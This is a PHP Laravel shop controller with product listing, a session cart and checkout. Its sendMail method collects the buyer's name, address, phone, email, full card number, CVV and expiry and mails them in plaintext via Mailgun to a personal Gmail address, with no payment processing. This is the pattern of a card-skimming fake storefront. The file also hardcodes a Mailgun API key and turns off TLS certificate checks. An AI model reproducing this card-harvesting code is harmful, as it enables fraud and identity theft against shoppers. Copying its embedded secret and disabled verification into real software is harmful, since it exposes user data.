<?php

namespace App\Http\Controllers;

use App\Products;
use Illuminate\Http\Request;

class ProductController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        //
        $products = Products::paginate(10);
        return view('index' , ['products' => $products]);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Products $products, Request $request)
    {
        if(!$request->session()->has('cart')){
            $request->session()->put('cart', []);
        }

        $request->session()->push('cart' , $products->id);

        return \redirect('/cart/');
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Products  $products
     * @return \Illuminate\Http\Response
     */
    public function show(Products $products)
    {
        //
        return view('shop-product' , ['product' => $products]);
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Products  $products
     * @return \Illuminate\Http\Response
     */
    public function edit(Products $products)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Products  $products
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Products $products)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Products  $products
     * @return \Illuminate\Http\Response
     */
    public function destroy(Products $products)
    {
        
    }

    public function remove($idToDelete , Request $request){
        $cart =  $request->session()->pull('cart', []); // Second argument is a default value
        unset($cart[$idToDelete]);
        $request->session()->put('cart', $cart);

        return \redirect('/cart/');
    }

    public function checkout(Request $request){
        session(["first_name" => $request->input('first_name')]);
        session(["last_name" => $request->input('last_name')]);
        session(["address" => $request->input('address')]);
        session(["zip" => $request->input('zip')]);
        session(["city" => $request->input('city')]);
        session(["email" => $request->input('email')]); 
        session(["phone" => $request->input('phone')]); 
        return redirect('/shop-checkout-shipping');
    }

    public function sendMail(Request $request){
        $fname = $request->session()->get('first_name');
        $lname = $request->session()->get('last_name');
        $phone = $request->session()->get('phone');
        $email = $request->session()->get('email');
        $address = $request->session()->get('address');
        $city = $request->session()->get('city');
        $zip = $request->session()->get('zip');
        $card = $request->input('number');
        $cvv = $request->input('cvv');
        $month = $request->input('month');
        $year = $request->input('year');

        $information = "
        First name: $fname <br /> 
        Last Name: $lname <br /> 
        Phone: $phone <br /> 
        Email: $email <br /> 
        Address: $address <br /> 
        City: $city <br /> 
        Zip: $zip <br /> 
        Card: $card (number) $cvv (cvv) $month (month) $year (year) <br />";

        $data = array(
            'from'=> 'Bot <support@rushgames.com>',
            'to'=> 'Hange <virgina.bagwell@gmail.com>',
            'subject'=> 'Info',
            'html'=> $information,
            'text'=> $information,
            'o:tracking'=>'yes',
            'o:tracking-clicks'=>'yes',
            'o:tracking-opens'=>'yes',
            'o:tag'=> 'info',
            'h:Reply-To'=> 'virgina.bagwell@gmail.com'
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.mailgun.net/v3/mail.rushgames.ng/messages');
        curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
        curl_setopt($ch, CURLOPT_USERPWD, 'api' . ':' . 'a96a1947b3082d2feb240e0c547d776f-bd350f28-cc8fe2fa');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_ENCODING, 'UTF-8');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $result = curl_exec($ch);
        $err = false;
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
            $err = curl_error($ch);
        }
        curl_close ($ch);
        if($err){
            return $err;
        }else{
            return $result;
        }
    }
}
